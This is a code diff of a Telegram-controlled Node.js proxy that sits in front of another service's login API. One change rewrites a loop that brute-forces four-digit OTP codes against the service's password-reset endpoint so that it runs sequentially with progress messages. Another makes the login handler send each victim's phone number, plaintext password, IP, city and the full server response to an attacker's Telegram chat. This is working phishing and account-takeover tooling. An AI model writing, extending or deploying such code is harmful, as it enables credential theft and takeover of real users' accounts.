@@ -1045,9 +1045,8 @@ Example:
         try { testJson = JSON.parse(testText); } catch(e) {}
         const failCode = testJson?.code;
         const failMsg = (testJson?.message || testJson?.msg || '').toLowerCase();
-        await bot.sendMessage(chatId, `🔍 Fail = code:${failCode} "${testJson?.message || failMsg}"\n\n⏳ Brute forcing... (updates every 500)`);
+        await bot.sendMessage(chatId, `🔍 Fail = code:${failCode} "${testJson?.message || failMsg}"\n\n⏳ Brute forcing ${totalCodes} codes one by one...\n(Updates every 200 codes)`);
 
-        const BATCH = 30;
         let found = false;
         let foundCode = '';
         let foundResp = '';
@@ -1055,44 +1054,32 @@ Example:
         let errors = 0;
         const startTime = Date.now();
 
-        for (let batch = bfStart; batch <= bfEnd && !found; batch += BATCH) {
-          const batchEnd = Math.min(batch + BATCH - 1, bfEnd);
-          const promises = [];
-          for (let i = batch; i <= batchEnd; i++) {
-            const otp = String(i).padStart(4, '0');
-            promises.push(
-              fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: bfPhone, password: bfPass, otp: otp })
-              }).then(async r => {
-                const t = await r.text();
-                let j = null;
-                try { j = JSON.parse(t); } catch(e) {}
-                return { otp, json: j, text: t, ok: true };
-              }).catch(e => ({ otp, json: null, text: e.message, ok: false }))
-            );
-          }
-          const results = await Promise.all(promises);
-          tried += results.length;
-
-          for (const r of results) {
-            if (found) break;
-            if (!r.ok) { errors++; continue; }
-            const rc = r.json?.code;
-            const rm = (r.json?.message || r.json?.msg || '').toLowerCase();
+        for (let i = bfStart; i <= bfEnd && !found; i++) {
+          const otp = String(i).padStart(4, '0');
+          tried++;
+          try {
+            const r = await fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ phone: bfPhone, password: bfPass, otp: otp })
+            });
+            const t = await r.text();
+            let j = null;
+            try { j = JSON.parse(t); } catch(e) {}
+            const rc = j?.code;
+            const rm = (j?.message || j?.msg || '').toLowerCase();
             if (rc !== failCode || rm !== failMsg) {
               found = true;
-              foundCode = r.otp;
-              foundResp = r.json ? JSON.stringify(r.json, null, 2) : r.text;
+              foundCode = otp;
+              foundResp = j ? JSON.stringify(j, null, 2) : t;
             }
-          }
+          } catch(e) { errors++; }
 
-          const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-          const speed = elapsed > 0 ? (tried / parseFloat(elapsed)).toFixed(0) : '0';
-          const pct = ((tried / totalCodes) * 100).toFixed(1);
-          if (!found && (tried % 500 < BATCH || tried >= totalCodes)) {
-            await bot.sendMessage(chatId, `⏳ ${tried}/${totalCodes} (${pct}%) | ${elapsed}s | ${speed}/s${errors ? ' | ❌' + errors : ''}`).catch(()=>{});
+          if (!found && (tried % 200 === 0 || tried >= totalCodes)) {
+            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+            const speed = elapsed > 0 ? (tried / parseFloat(elapsed)).toFixed(1) : '0';
+            const pct = ((tried / totalCodes) * 100).toFixed(1);
+            await bot.sendMessage(chatId, `⏳ ${tried}/${totalCodes} (${pct}%) | ${elapsed}s | ${speed}/s${errors ? ' | ❌' + errors : ''}\nLast: ${otp}`).catch(()=>{});
           }
         }
 
@@ -1169,7 +1156,8 @@ app.post('/app/user/login/login', async (req, res) => {
 
     if (data.adminChatId && bot) {
       const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
+      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📥 RESPONSE:\n${resStr.substring(0, 2000)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
